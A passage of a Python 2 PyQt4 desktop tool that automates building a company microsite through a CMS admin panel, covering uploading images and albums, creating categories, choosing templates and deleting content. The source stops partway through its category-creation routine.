# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'E:\python\���ٽ�վ\main.ui'
#
# Created: Mon Jun 08 22:48:38 2015
#    by: PyQt4 UI code generator 4.11.3
#
# WARNING! All changes made in this file will be lost!
import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )

from PyQt4 import QtCore, QtGui
from PyQt4 import QtWebKit
try:
  _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
  def _fromUtf8(s):
    return s

try:
  _encoding = QtGui.QApplication.UnicodeUTF8
  def _translate(context, text, disambig):
    return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
  def _translate(context, text, disambig):
    return QtGui.QApplication.translate(context, text, disambig)
class Ui_Dialog(QtGui.QDialog):
  def setupUi(self, Dialog):
    Dialog.setObjectName(_fromUtf8("Dialog"))
    Dialog.resize(1052, 758)
    Dialog.setSizeGripEnabled(True)
    self.tabWidget = QtGui.QTabWidget(Dialog)
    self.tabWidget.setGeometry(QtCore.QRect(0, 0, 651, 551))
    self.tabWidget.setObjectName(_fromUtf8("tabWidget"))
    self.tab = QtGui.QWidget()
    self.tab.setObjectName(_fromUtf8("tab"))
    self.horizontalLayoutWidget = QtGui.QWidget(self.tab)
    self.horizontalLayoutWidget.setGeometry(QtCore.QRect(10, 0, 631, 51))
    self.horizontalLayoutWidget.setObjectName(_fromUtf8("horizontalLayoutWidget"))
    self.horizontalLayout = QtGui.QHBoxLayout(self.horizontalLayoutWidget)
    self.horizontalLayout.setMargin(0)
    self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
    self.pb_deldata = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_deldata.setObjectName(_fromUtf8("pb_deldata"))
    self.horizontalLayout.addWidget(self.pb_deldata)
    self.pb_scbjt = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_scbjt.setObjectName(_fromUtf8("pb_scbjt"))
    self.horizontalLayout.addWidget(self.pb_scbjt)
    self.pb_scfl = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_scfl.setObjectName(_fromUtf8("pb_scfl"))
    self.horizontalLayout.addWidget(self.pb_scfl)
    self.pb_scwz = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_scwz.setObjectName(_fromUtf8("pb_scwz"))
    self.horizontalLayout.addWidget(self.pb_scwz)
    self.pb_scxc = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_scxc.setObjectName(_fromUtf8("pb_scxc"))
    self.horizontalLayout.addWidget(self.pb_scxc)
    self.horizontalLayoutWidget_4 = QtGui.QWidget(self.tab)
    self.horizontalLayoutWidget_4.setGeometry(QtCore.QRect(10, 240, 631, 51))
    self.horizontalLayoutWidget_4.setObjectName(_fromUtf8("horizontalLayoutWidget_4"))
    self.horizontalLayout_4 = QtGui.QHBoxLayout(self.horizontalLayoutWidget_4)
    self.horizontalLayout_4.setMargin(0)
    self.horizontalLayout_4.setObjectName(_fromUtf8("horizontalLayout_4"))
    self.label_5 = QtGui.QLabel(self.horizontalLayoutWidget_4)
    self.label_5.setObjectName(_fromUtf8("label_5"))
    self.horizontalLayout_4.addWidget(self.label_5)
    self.le_wzfl1 = QtGui.QLineEdit(self.horizontalLayoutWidget_4)
    self.le_wzfl1.setObjectName(_fromUtf8("le_wzfl1"))
    self.horizontalLayout_4.addWidget(self.le_wzfl1)
    self.pb_upwz1 = QtGui.QPushButton(self.horizontalLayoutWidget_4)
    self.pb_upwz1.setObjectName(_fromUtf8("pb_upwz1"))
    self.horizontalLayout_4.addWidget(self.pb_upwz1)
    self.le_wzfl2 = QtGui.QLineEdit(self.horizontalLayoutWidget_4)
    self.le_wzfl2.setObjectName(_fromUtf8("le_wzfl2"))
    self.horizontalLayout_4.addWidget(self.le_wzfl2)
    self.pb_upwz2 = QtGui.QPushButton(self.horizontalLayoutWidget_4)
    self.pb_upwz2.setObjectName(_fromUtf8("pb_upwz2"))
    self.horizontalLayout_4.addWidget(self.pb_upwz2)
    self.horizontalLayoutWidget_7 = QtGui.QWidget(self.tab)
    self.horizontalLayoutWidget_7.setGeometry(QtCore.QRect(10, 120, 631, 51))
    self.horizontalLayoutWidget_7.setObjectName(_fromUtf8("horizontalLayoutWidget_7"))
    self.horizontalLayout_7 = QtGui.QHBoxLayout(self.horizontalLayoutWidget_7)
    self.horizontalLayout_7.setMargin(0)
    self.horizontalLayout_7.setObjectName(_fromUtf8("horizontalLayout_7"))
    self.label_4 = QtGui.QLabel(self.horizontalLayoutWidget_7)
    self.label_4.setEnabled(True)
    self.label_4.setObjectName(_fromUtf8("label_4"))
    self.horizontalLayout_7.addWidget(self.label_4)
    self.le_xcfl1 = QtGui.QLineEdit(self.horizontalLayoutWidget_7)
    self.le_xcfl1.setObjectName(_fromUtf8("le_xcfl1"))
    self.horizontalLayout_7.addWidget(self.le_xcfl1)
    self.pb_upxc1 = QtGui.QPushButton(self.horizontalLayoutWidget_7)
    self.pb_upxc1.setObjectName(_fromUtf8("pb_upxc1"))
    self.horizontalLayout_7.addWidget(self.pb_upxc1)
    self.le_xcfl2 = QtGui.QLineEdit(self.horizontalLayoutWidget_7)
    self.le_xcfl2.setObjectName(_fromUtf8("le_xcfl2"))
    self.horizontalLayout_7.addWidget(self.le_xcfl2)
    self.pb_upxc2 = QtGui.QPushButton(self.horizontalLayoutWidget_7)
    self.pb_upxc2.setObjectName(_fromUtf8("pb_upxc2"))
    self.horizontalLayout_7.addWidget(self.pb_upxc2)
    self.horizontalLayoutWidget_8 = QtGui.QWidget(self.tab)
    self.horizontalLayoutWidget_8.setGeometry(QtCore.QRect(10, 180, 631, 51))
    self.horizontalLayoutWidget_8.setObjectName(_fromUtf8("horizontalLayoutWidget_8"))
    self.horizontalLayout_8 = QtGui.QHBoxLayout(self.horizontalLayoutWidget_8)
    self.horizontalLayout_8.setMargin(0)
    self.horizontalLayout_8.setObjectName(_fromUtf8("horizontalLayout_8"))
    self.label_3 = QtGui.QLabel(self.horizontalLayoutWidget_8)
    self.label_3.setObjectName(_fromUtf8("label_3"))
    self.horizontalLayout_8.addWidget(self.label_3)
    self.le_fl1 = QtGui.QLineEdit(self.horizontalLayoutWidget_8)
    self.le_fl1.setObjectName(_fromUtf8("le_fl1"))
    self.horizontalLayout_8.addWidget(self.le_fl1)
    self.le_fl2 = QtGui.QLineEdit(self.horizontalLayoutWidget_8)
    self.le_fl2.setObjectName(_fromUtf8("le_fl2"))
    self.horizontalLayout_8.addWidget(self.le_fl2)
    self.le_fl3 = QtGui.QLineEdit(self.horizontalLayoutWidget_8)
    self.le_fl3.setObjectName(_fromUtf8("le_fl3"))
    self.horizontalLayout_8.addWidget(self.le_fl3)
    self.pb_onebuild = QtGui.QPushButton(self.horizontalLayoutWidget_8)
    self.pb_onebuild.setObjectName(_fromUtf8("pb_onebuild"))
    self.horizontalLayout_8.addWidget(self.pb_onebuild)
    self.pte_jj = QtGui.QPlainTextEdit(self.tab)
    self.pte_jj.setGeometry(QtCore.QRect(10, 350, 631, 171))
    self.pte_jj.setUndoRedoEnabled(True)
    self.pte_jj.setOverwriteMode(False)
    self.pte_jj.setObjectName(_fromUtf8("pte_jj"))
    self.horizontalLayoutWidget_3 = QtGui.QWidget(self.tab)
    self.horizontalLayoutWidget_3.setGeometry(QtCore.QRect(10, 300, 631, 51))
    self.horizontalLayoutWidget_3.setObjectName(_fromUtf8("horizontalLayoutWidget_3"))
    self.horizontalLayout_3 = QtGui.QHBoxLayout(self.horizontalLayoutWidget_3)
    self.horizontalLayout_3.setMargin(0)
    self.horizontalLayout_3.setObjectName(_fromUtf8("horizontalLayout_3"))
    self.label = QtGui.QLabel(self.horizontalLayoutWidget_3)
    self.label.setObjectName(_fromUtf8("label"))
    self.horizontalLayout_3.addWidget(self.label)
    self.pb_upwz = QtGui.QPushButton(self.horizontalLayoutWidget_3)
    self.pb_upwz.setObjectName(_fromUtf8("pb_upwz"))
    self.horizontalLayout_3.addWidget(self.pb_upwz)
    self.pb_upjj = QtGui.QPushButton(self.horizontalLayoutWidget_3)
    self.pb_upjj.setObjectName(_fromUtf8("pb_upjj"))
    self.horizontalLayout_3.addWidget(self.pb_upjj)
    self.horizontalLayoutWidget_5 = QtGui.QWidget(self.tab)
    self.horizontalLayoutWidget_5.setGeometry(QtCore.QRect(10, 60, 631, 51))
    self.horizontalLayoutWidget_5.setObjectName(_fromUtf8("horizontalLayoutWidget_5"))
    self.horizontalLayout_5 = QtGui.QHBoxLayout(self.horizontalLayoutWidget_5)
    self.horizontalLayout_5.setMargin(0)
    self.horizontalLayout_5.setObjectName(_fromUtf8("horizontalLayout_5"))
    self.pb_upsybj = QtGui.QPushButton(self.horizontalLayoutWidget_5)
    self.pb_upsybj.setObjectName(_fromUtf8("pb_upsybj"))
    self.horizontalLayout_5.addWidget(self.pb_upsybj)
    self.pb_smb = QtGui.QPushButton(self.horizontalLayoutWidget_5)
    self.pb_smb.setObjectName(_fromUtf8("pb_smb"))
    self.horizontalLayout_5.addWidget(self.pb_smb)
    self.pb_xmb = QtGui.QPushButton(self.horizontalLayoutWidget_5)
    self.pb_xmb.setObjectName(_fromUtf8("pb_xmb"))
    self.horizontalLayout_5.addWidget(self.pb_xmb)
    self.pb_zmb = QtGui.QPushButton(self.horizontalLayoutWidget_5)
    self.pb_zmb.setObjectName(_fromUtf8("pb_zmb"))
    self.horizontalLayout_5.addWidget(self.pb_zmb)
    self.tabWidget.addTab(self.tab, _fromUtf8(""))
    self.tab_2 = QtGui.QWidget()
    self.tab_2.setObjectName(_fromUtf8("tab_2"))
    self.formLayoutWidget = QtGui.QWidget(self.tab_2)
    self.formLayoutWidget.setGeometry(QtCore.QRect(0, 0, 641, 521))
    self.formLayoutWidget.setObjectName(_fromUtf8("formLayoutWidget"))
    self.formLayout = QtGui.QFormLayout(self.formLayoutWidget)
    self.formLayout.setFieldGrowthPolicy(QtGui.QFormLayout.AllNonFixedFieldsGrow)
    self.formLayout.setMargin(0)
    self.formLayout.setObjectName(_fromUtf8("formLayout"))
    self.label_6 = QtGui.QLabel(self.formLayoutWidget)
    self.label_6.setMinimumSize(QtCore.QSize(80, 31))
    self.label_6.setObjectName(_fromUtf8("label_6"))
    self.formLayout.setWidget(0, QtGui.QFormLayout.LabelRole, self.label_6)
    self.le_gsjc = QtGui.QLineEdit(self.formLayoutWidget)
    self.le_gsjc.setMinimumSize(QtCore.QSize(0, 31))
    self.le_gsjc.setObjectName(_fromUtf8("le_gsjc"))
    self.formLayout.setWidget(0, QtGui.QFormLayout.FieldRole, self.le_gsjc)
    self.label_8 = QtGui.QLabel(self.formLayoutWidget)
    self.label_8.setMinimumSize(QtCore.QSize(80, 31))
    self.label_8.setObjectName(_fromUtf8("label_8"))
    self.formLayout.setWidget(1, QtGui.QFormLayout.LabelRole, self.label_8)
    self.le_hyfl = QtGui.QLineEdit(self.formLayoutWidget)
    self.le_hyfl.setMinimumSize(QtCore.QSize(0, 31))
    self.le_hyfl.setObjectName(_fromUtf8("le_hyfl"))
    self.formLayout.setWidget(1, QtGui.QFormLayout.FieldRole, self.le_hyfl)
    self.label_7 = QtGui.QLabel(self.formLayoutWidget)
    self.label_7.setMinimumSize(QtCore.QSize(80, 31))
    self.label_7.setObjectName(_fromUtf8("label_7"))
    self.formLayout.setWidget(2, QtGui.QFormLayout.LabelRole, self.label_7)
    self.le_ksdl = QtGui.QLineEdit(self.formLayoutWidget)
    self.le_ksdl.setMinimumSize(QtCore.QSize(0, 31))
    self.le_ksdl.setObjectName(_fromUtf8("le_ksdl"))
    self.formLayout.setWidget(2, QtGui.QFormLayout.FieldRole, self.le_ksdl)
    self.label_11 = QtGui.QLabel(self.formLayoutWidget)
    self.label_11.setMinimumSize(QtCore.QSize(80, 31))
    self.label_11.setObjectName(_fromUtf8("label_11"))
    self.formLayout.setWidget(3, QtGui.QFormLayout.LabelRole, self.label_11)
    self.le_gsdz = QtGui.QLineEdit(self.formLayoutWidget)
    self.le_gsdz.setMinimumSize(QtCore.QSize(0, 31))
    self.le_gsdz.setObjectName(_fromUtf8("le_gsdz"))
    self.formLayout.setWidget(3, QtGui.QFormLayout.FieldRole, self.le_gsdz)
    self.label_9 = QtGui.QLabel(self.formLayoutWidget)
    self.label_9.setMinimumSize(QtCore.QSize(80, 31))
    self.label_9.setObjectName(_fromUtf8("label_9"))
    self.formLayout.setWidget(4, QtGui.QFormLayout.LabelRole, self.label_9)
    self.pte_sh = QtGui.QPlainTextEdit(self.formLayoutWidget)
    self.pte_sh.setMinimumSize(QtCore.QSize(0, 360))
    self.pte_sh.setObjectName(_fromUtf8("pte_sh"))
    self.formLayout.setWidget(4, QtGui.QFormLayout.FieldRole, self.pte_sh)
    self.tabWidget.addTab(self.tab_2, _fromUtf8(""))
    self.webView = QtWebKit.QWebView(Dialog)
    self.webView.setGeometry(QtCore.QRect(660, 60, 381, 691))
    self.webView.setUrl(QtCore.QUrl(_fromUtf8("about:blank")))
    self.webView.setObjectName(_fromUtf8("webView"))
    self.horizontalLayoutWidget_2 = QtGui.QWidget(Dialog)
    self.horizontalLayoutWidget_2.setGeometry(QtCore.QRect(660, 10, 381, 41))
    self.horizontalLayoutWidget_2.setObjectName(_fromUtf8("horizontalLayoutWidget_2"))
    self.horizontalLayout_2 = QtGui.QHBoxLayout(self.horizontalLayoutWidget_2)
    self.horizontalLayout_2.setMargin(0)
    self.horizontalLayout_2.setObjectName(_fromUtf8("horizontalLayout_2"))
    self.label_2 = QtGui.QLabel(self.horizontalLayoutWidget_2)
    self.label_2.setObjectName(_fromUtf8("label_2"))
    self.horizontalLayout_2.addWidget(self.label_2, QtCore.Qt.AlignHCenter)
    self.refreshweb = QtGui.QPushButton(self.horizontalLayoutWidget_2)
    self.refreshweb.setObjectName(_fromUtf8("refreshweb"))
    self.horizontalLayout_2.addWidget(self.refreshweb)
    self.pte_log = QtGui.QPlainTextEdit(Dialog)
    self.pte_log.setGeometry(QtCore.QRect(10, 560, 301, 191))
    self.pte_log.setReadOnly(True)
    self.pte_log.setObjectName(_fromUtf8("pte_log"))
    self.horizontalLayoutWidget_6 = QtGui.QWidget(Dialog)
    self.horizontalLayoutWidget_6.setGeometry(QtCore.QRect(320, 560, 331, 191))
    self.horizontalLayoutWidget_6.setObjectName(_fromUtf8("horizontalLayoutWidget_6"))
    self.verticalLayout = QtGui.QVBoxLayout(self.horizontalLayoutWidget_6)
    self.verticalLayout.setMargin(0)
    self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
    self.pb_up1 = QtGui.QPushButton(self.horizontalLayoutWidget_6)
    self.pb_up1.setObjectName(_fromUtf8("pb_up1"))
    self.verticalLayout.addWidget(self.pb_up1)
    self.pb_up2 = QtGui.QPushButton(self.horizontalLayoutWidget_6)
    self.pb_up2.setObjectName(_fromUtf8("pb_up2"))
    self.verticalLayout.addWidget(self.pb_up2)
    self.pb_up3 = QtGui.QPushButton(self.horizontalLayoutWidget_6)
    self.pb_up3.setObjectName(_fromUtf8("pb_up3"))
    self.verticalLayout.addWidget(self.pb_up3)
    self.pb_up4 = QtGui.QPushButton(self.horizontalLayoutWidget_6)
    self.pb_up4.setObjectName(_fromUtf8("pb_up4"))
    self.verticalLayout.addWidget(self.pb_up4)
    self.pb_giveup = QtGui.QPushButton(self.horizontalLayoutWidget_6)
    self.pb_giveup.setObjectName(_fromUtf8("pb_giveup"))
    self.verticalLayout.addWidget(self.pb_giveup)

    self.retranslateUi(Dialog)
    self.tabWidget.setCurrentIndex(0)
    QtCore.QObject.connect(self.pb_deldata, QtCore.SIGNAL(_fromUtf8("clicked()")), self.deldata)
    QtCore.QObject.connect(self.pb_smb, QtCore.SIGNAL(_fromUtf8("clicked()")), self.smb)
    QtCore.QObject.connect(self.pb_xmb, QtCore.SIGNAL(_fromUtf8("clicked()")), self.xmb)
    QtCore.QObject.connect(self.pb_zmb, QtCore.SIGNAL(_fromUtf8("clicked()")), self.zmb)
    QtCore.QObject.connect(self.pb_onebuild, QtCore.SIGNAL(_fromUtf8("clicked()")), self.onebuild)
    QtCore.QObject.connect(self.pb_upsybj, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upsybj)
    QtCore.QObject.connect(self.pb_upwz, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upwz)
    QtCore.QObject.connect(self.pb_upwz1, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upwz1)
    QtCore.QObject.connect(self.pb_upwz2, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upwz2)
    QtCore.QObject.connect(self.pb_upxc1, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upxc1)
    QtCore.QObject.connect(self.pb_upxc2, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upxc2)
    QtCore.QObject.connect(self.pte_log, QtCore.SIGNAL(_fromUtf8("textChanged()")), self.pte_log.selectAll)
    QtCore.QObject.connect(self.refreshweb, QtCore.SIGNAL(_fromUtf8("clicked()")), self.reweb)
    QtCore.QObject.connect(self.pb_upjj, QtCore.SIGNAL(_fromUtf8("clicked()")), self.upjj)
    QtCore.QObject.connect(self.pb_up1, QtCore.SIGNAL(_fromUtf8("clicked()")), self.up1)
    QtCore.QObject.connect(self.pb_up2, QtCore.SIGNAL(_fromUtf8("clicked()")), self.up2)
    QtCore.QObject.connect(self.pb_up3, QtCore.SIGNAL(_fromUtf8("clicked()")), self.up3)
    QtCore.QObject.connect(self.pb_up4, QtCore.SIGNAL(_fromUtf8("clicked()")), self.up4)
    QtCore.QObject.connect(self.pb_giveup, QtCore.SIGNAL(_fromUtf8("clicked()")), self.giveup)
    QtCore.QObject.connect(self.pb_scbjt, QtCore.SIGNAL(_fromUtf8("clicked()")), self.scbjt)
    QtCore.QObject.connect(self.pb_scfl, QtCore.SIGNAL(_fromUtf8("clicked()")), self.scfl)
    QtCore.QObject.connect(self.pb_scwz, QtCore.SIGNAL(_fromUtf8("clicked()")), self.scwz)
    QtCore.QObject.connect(self.pb_scxc, QtCore.SIGNAL(_fromUtf8("clicked()")), self.scxc)
    QtCore.QMetaObject.connectSlotsByName(Dialog)
    Dialog.setTabOrder(self.pb_deldata, self.le_xcfl1)
    Dialog.setTabOrder(self.le_xcfl1, self.pb_upxc1)
    Dialog.setTabOrder(self.pb_upxc1, self.le_xcfl2)
    Dialog.setTabOrder(self.le_xcfl2, self.pb_upxc2)
    Dialog.setTabOrder(self.pb_upxc2, self.le_fl1)
    Dialog.setTabOrder(self.le_fl1, self.le_fl2)
    Dialog.setTabOrder(self.le_fl2, self.le_fl3)
    Dialog.setTabOrder(self.le_fl3, self.pb_onebuild)
    Dialog.setTabOrder(self.pb_onebuild, self.le_wzfl1)
    Dialog.setTabOrder(self.le_wzfl1, self.pb_upwz1)
    Dialog.setTabOrder(self.pb_upwz1, self.le_wzfl2)
    Dialog.setTabOrder(self.le_wzfl2, self.pb_upwz2)
    Dialog.setTabOrder(self.pb_upwz2, self.pte_jj)
    Dialog.setTabOrder(self.pte_jj, self.pb_upjj)
    Dialog.setTabOrder(self.pb_upjj, self.refreshweb)
    Dialog.setTabOrder(self.refreshweb, self.pb_up1)
    Dialog.setTabOrder(self.pb_up1, self.pb_up2)
    Dialog.setTabOrder(self.pb_up2, self.pb_up3)
    Dialog.setTabOrder(self.pb_up3, self.pb_up4)
    Dialog.setTabOrder(self.pb_up4, self.pte_log)
    Dialog.setTabOrder(self.pte_log, self.webView)
    Dialog.setTabOrder(self.webView, self.le_gsjc)
    Dialog.setTabOrder(self.le_gsjc, self.tabWidget)
    Dialog.setTabOrder(self.tabWidget, self.le_ksdl)
    Dialog.setTabOrder(self.le_ksdl, self.le_hyfl)

  def retranslateUi(self, Dialog):
    Dialog.setWindowTitle(_translate("Dialog", "快速建站", None))
    self.pb_deldata.setText(_translate("Dialog", "清空数据", None))
    self.pb_scbjt.setText(_translate("Dialog", "删除背景图", None))
    self.pb_scfl.setText(_translate("Dialog", "删除分类", None))
    self.pb_scwz.setText(_translate("Dialog", "删除文章", None))
    self.pb_scxc.setText(_translate("Dialog", "删除相册", None))
    self.label_5.setText(_translate("Dialog", "文章", None))
    self.le_wzfl1.setText(_translate("Dialog", "行业新闻", None))
    self.pb_upwz1.setText(_translate("Dialog", "上传文章1", None))
    self.le_wzfl2.setText(_translate("Dialog", "相关动态", None))
    self.pb_upwz2.setText(_translate("Dialog", "上传文章2", None))
    self.label_4.setText(_translate("Dialog", "相册", None))
    self.le_xcfl1.setText(_translate("Dialog", "相关展示", None))
    self.pb_upxc1.setText(_translate("Dialog", "上传相册1", None))
    self.le_xcfl2.setText(_translate("Dialog", "相关相册", None))
    self.pb_upxc2.setText(_translate("Dialog", "上传相册2", None))
    self.label_3.setText(_translate("Dialog", "分类", None))
    self.le_fl1.setText(_translate("Dialog", "关于我们", None))
    self.le_fl2.setText(_translate("Dialog", "相关资讯", None))
    self.le_fl3.setText(_translate("Dialog", "相关展示", None))
    self.pb_onebuild.setText(_translate("Dialog", "一键创建", None))
    self.label.setText(_translate("Dialog", "简介", None))
    self.pb_upwz.setText(_translate("Dialog", "上传文章", None))
    self.pb_upjj.setText(_translate("Dialog", "上传简介", None))
    self.pb_upsybj.setText(_translate("Dialog", "上传首页背景", None))
    self.pb_smb.setText(_translate("Dialog", "上模板", None))
    self.pb_xmb.setText(_translate("Dialog", "下模板", None))
    self.pb_zmb.setText(_translate("Dialog", "左模板", None))
    self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("Dialog", "快速搭建", None))
    self.label_6.setText(_translate("Dialog", "公司简称", None))
    self.label_8.setText(_translate("Dialog", "黄页分类", None))
    self.label_7.setText(_translate("Dialog", "快速登录", None))
    self.label_11.setText(_translate("Dialog", "公司地址", None))
    self.label_9.setText(_translate("Dialog", "审　　核", None))
    self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("Dialog", "企业信息", None))
    self.label_2.setText(_translate("Dialog", "实时视图", None))
    self.refreshweb.setText(_translate("Dialog", "刷新", None))
    self.pte_log.setPlainText(_translate("Dialog", "操作日志", None))
    self.pb_up1.setText(_translate("Dialog", "提交1.0", None))
    self.pb_up2.setText(_translate("Dialog", "提交2.0", None))
    self.pb_up3.setText(_translate("Dialog", "提交3.0", None))
    self.pb_up4.setText(_translate("Dialog", "提交4.0", None))
    self.pb_giveup.setText(_translate("Dialog", "放弃", None))

    
    self.le_gsjc.setText(_translate("Dialog", gsjc.decode("gbk"), None))
    self.le_ksdl.setText(_translate("Dialog", "http://oa.qz160168.cn/wljcburl.asp?Menu=jump&id=%s"%id, None))
    self.le_hyfl.setText(_translate("Dialog", hyfl.decode("gbk"), None))
    self.le_gsdz.setText(_translate("Dialog", gsdz.decode("gbk"), None))
    self.pte_sh.setPlainText(_translate("Dialog", shbz.decode("gbk").replace("<br>","\n"), None))
    self.webView.setUrl(QtCore.QUrl(_fromUtf8(ksckurl)))
    self.pte_jj.setPlainText(_translate("Dialog",u"\n　　"+gsjj.decode("gbk")+u"\n\n　　我们尊崇“踏实、拼搏、责任”的行业精神，并以诚信、共赢、开创经营理念，创造良好的行业环境，以全新的管理模式，完善的技术，周到的服务，卓越的品质为生存根本。\n\n　　我们始终坚持用户至上用心服务于客户，坚持用自己的服务去打动客户。\n\n　　欢迎各位来参观指导工作，如果您对我们有任何的疑问或者建议，您可以直接给我们留言或直接与我们联络，我们将在收到您的信息后，会第一时间及时与您联络。", None))
  def worker(self):
    self.pte_log.appendPlainText(u"胖胖")
  def test(self):
    t = threading.Thread(target=self.worker)
    t.start()
    self.webView.setUrl(QtCore.QUrl(_fromUtf8("http://www.baidu.com")))
    #self.le_log.setText(self.le_log.text()+"ewe")
    #options = QtGui.QFileDialog.Options()

    #fileName = QtGui.QFileDialog.getOpenFileName(self)
    
    #print len(fileName)
  #选择文件
  def selectfile(self):
    filelist = QtGui.QFileDialog.getOpenFileNames(self)
    flist=[]
    for i in filelist:
      flist.append(unicode(i))
    return flist
  #上传文件并处理图片链接列表
  def upfile(self,flist):
    urllist=[]
    for i in flist:
      try:
        data=postfile(i)
        data=eval(data)
        if data["error"] == 0:
          urllist.append(data["url"].replace("\\",""))
        else:
          self.pte_log.appendPlainText(u"%s上传失败"%i)
      except Exception,ex:
        self.pte_log.appendPlainText(u"%s上传失败"%i)
    return urllist
  #刷新
  def reweb(self):
    self.webView.setUrl(QtCore.QUrl(_fromUtf8(ksckurl)))


    
  def deldata(self):
    self.scbjt()
    self.scfl()
    self.scwz()
    self.scxc()
  def scbjt(self):
    #删除背景图
    url="/index.php?g=User&m=Flash&a=index&tip=2&token="+token
    data=request(host1, url, headers1)
    try:
      for i in re.findall(", '(.*?)'",data):
        request(host1, i, headers1)
    except Exception,ex:pass
    self.pte_log.appendPlainText(u"删除背景图")
    self.reweb()
  def scfl(self):
    #删除分类
    url="/index.php?g=User&m=Classify&a=index&token="+token
    data=request(host1, url, headers1)
    try:
      for i in re.findall('href="(.*?)">删',data):
        request(host1, i, headers1)
    except Exception,ex:pass
    self.pte_log.appendPlainText(u"删除分类")
    self.reweb()
  def scwz(self):
    #删除文章
    url="/index.php?g=User&m=Img&a=index&token="+token
    data=request(host1, url, headers1)
    try:
      for i in re.findall('href="(.*?)">删',data):
        request(host1, i, headers1)
    except Exception,ex:pass
    self.pte_log.appendPlainText(u"删除文章")
    self.reweb()
  def scxc(self):
    #删除相册
    url="/index.php?g=User&m=Photo&a=index&token="+token
    data=request(host1, url, headers1)
    try:
      for i in re.findall(", '(.*?)'",data):
        request(host1, i, headers1)
    except Exception,ex:pass
    self.pte_log.appendPlainText(u"删除相册")
    self.reweb()

  #首页背景
  def upsybj(self):
    flist=self.selectfile()
    if len(flist) > 0:
      urllist=self.upfile(flist)
      if len(urllist) > 0:
        for i in urllist:
          url="/index.php?g=User&m=Flash&a=add&tip=2"
          data=request(host1, url, headers1)   
          __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
          url="/index.php?g=User&m=Flash&a=insert&tip=2"
          pd={}
          pd["tip"]="2"
          pd["img"]=i
          pd["__hash__"]=__hash__ 
          data=request(host1, url, headers1,urllib.urlencode(pd))
          
        self.pte_log.appendPlainText(u"背景图上传完毕")  
      else:
        self.pte_log.appendPlainText(u"文件上传失败")
    else:
      self.pte_log.appendPlainText(u"没有选择文件")
    self.reweb()
    
  #模板  
  def smb(self):
    url="/index.php?g=User&m=Tmpls&a=add&style=255"
    request(host1, url, headers1)
    self.pte_log.appendPlainText(u"选择了上模板")
    self.reweb()
  def xmb(self):
    url="/index.php?g=User&m=Tmpls&a=add&style=254"
    request(host1, url, headers1)
    self.pte_log.appendPlainText(u"选择了下模板")
    self.reweb()
  def zmb(self):
    url="/index.php?g=User&m=Tmpls&a=add&style=13"
    request(host1, url, headers1)
    self.pte_log.appendPlainText(u"选择了左模板")
    self.reweb()

  #上传相册
  def upxc(self,xcn):
    if xcn==1:
      xc=self.le_xcfl1.text()
    if xcn==2:
      xc=self.le_xcfl2.text()
    self.pte_log.appendPlainText(u"创建相册：%s"%xc)
    flist=self.selectfile()
    if len(flist) > 0:
      urllist=self.upfile(flist)
      if len(urllist) > 0:
        #创建相册
        url="/index.php?g=User&m=Photo&a=index&token=%s"%token
        data=request(host1, url, headers1)
        if data.find(u"<h6>%s</h6>"%unicode(xc)) == -1:#如果没这个相册就创建一个
          url="/index.php?g=User&m=Photo&a=add"
          data=request(host1, url, headers1)   
          __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
          
          url="/index.php?g=User&m=Photo&a=add&token=%s"%token
          data=request(host1, url, headers1,"button=&title=%s&picurl=%s&info=%s&isshowinfo=0&status=1&__hash__=%s"%(en(unicode(xc)), urllist[0],en(unicode(xc)),__hash__))
          url="/index.php?g=User&m=Photo&a=index&token=%s"%token
          data=request(host1, url, headers1)

        data=re.findall('<a title=(.*?)>',data)
        pid=[]
        for i in data:
          if i.find(unicode(xc)) != -1:
            pid.append(re.findall('id=(.*?)"',i)[0])
        if xcn==1:
          pid=pid[0]
        if xcn==2:
          pid=pid[len(pid)-1]
        url="/index.php?g=User&m=Photo&a=list_add&id=%s"%pid
        data=request(host1, url, headers1)   
        __hash__=re.findall('__hash__" value="(.*?)"',data)[0]        
        url="/index.php?g=User&m=Photo&a=list_add&id=%s"%pid
        pd={}
        pd["pid"]=pid
        pd["__hash__"]=__hash__ 
        for i in range(len(urllist)):
          pd["sort_%d"%i]=str(i)
          pd["picurl_%d"%i]=urllist[i]
          pd["status_%d"%i]="1"
        data=request(host1, url, headers1,urllib.urlencode(pd))
        self.pte_log.appendPlainText(u"相册：%s上传完毕"%xc)  
      else:
        self.pte_log.appendPlainText(u"文件上传失败")
    else:
      self.pte_log.appendPlainText(u"没有选择文件")
  def upxc1(self):
    self.upxc(1)
    self.reweb()
  def upxc2(self):
    self.upxc(2)
    self.reweb()


  #创建分类
  def onebuild(self):
    #公司简介
    self.pte_log.appendPlainText(u"创建%s"%self.le_fl1.text())
    url="/index.php?g=User&m=Classify&a=add"
    data=request(host1, url, headers1)   
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    url="/index.php?g=User&m=Classify&a=insert"
    pd={}
    pd["name"]=en(unicode(self.le_fl1.text()))
    pd["img"]="http://37t.cn/tpl/static/attachment/icon/lovely/bill.png"
    pd["sorts"]="60"
    pd["tpid"]="258"
    pd["conttpid"]="1"
    pd["status"]="1"
    pd["url"]=""
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"%s创建完成"%self.le_fl1.text())
    
    #相关资讯
    self.pte_log.appendPlainText(u"创建%s"%self.le_fl2.text())
    url="/index.php?g=User&m=Classify&a=add"
    data=request(host1, url, headers1)   
